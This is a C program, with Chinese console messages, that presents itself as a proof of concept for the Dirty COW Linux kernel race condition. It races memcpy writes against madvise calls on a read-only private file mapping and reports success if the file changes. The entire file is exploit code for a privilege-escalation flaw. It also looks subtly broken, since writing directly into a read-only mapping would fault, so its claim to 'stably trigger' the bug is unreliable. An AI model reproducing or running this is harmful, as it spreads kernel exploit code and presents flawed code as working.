#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>

#define RACE_ITERATIONS 100000000

const char *new_content = "SUCCESS: The COW is dirty!";

void *write_thread(void *arg) {
    char *mem = (char *)arg;
    int len = strlen(new_content);
    for (long i = 0; i < RACE_ITERATIONS; i++) {
        memcpy(mem, new_content, len);
    }
    return NULL;
}

void *madvise_thread(void *arg) {
    char *mem = (char *)arg;
    size_t file_size = strlen(new_content);
    for (long i = 0; i < RACE_ITERATIONS; i++) {
        madvise(mem, file_size, MADV_DONTNEED);
    }
    return NULL;
}

int main() {
    const char *filepath = "readonly_file.txt";
    const char *original_content = "This is the original text.";

    int fd = open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    write(fd, original_content, strlen(original_content));
    close(fd);

    printf("--- Dirty COW 高强度概念验证程序 (在自建环境中) ---\n");
    printf("创建文件 '%s'，内容为: \"%s\"\n", filepath, original_content);

    fd = open(filepath, O_RDONLY);
    struct stat st;
    fstat(fd, &st);
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    printf("以只读模式映射内存，开始高强度竞争...\n\n");

    pthread_t pth_write, pth_madvise;
    pthread_create(&pth_write, NULL, write_thread, map);
    pthread_create(&pth_madvise, NULL, madvise_thread, map);
    pthread_join(pth_write, NULL);
    pthread_join(pth_madvise, NULL);

    printf("竞争结束，正在读取文件最终内容...\n\n");

    fd = open(filepath, O_RDONLY);
    char final_content[100] = {0};
    read(fd, final_content, sizeof(final_content) - 1);
    close(fd);

    printf("==================== 最终结果 ====================\n");
    printf("文件内容为: \"%s\"\n", final_content);
    if (strstr(final_content, "SUCCESS")) {
        printf("\n结论：成功！Dirty COW漏洞被稳定触发。\n");
    } else {
        printf("\n结论：失败。\n");
    }
    printf("==================================================\n");

    munmap(map, st.st_size);
    unlink(filepath);
    return 0;
}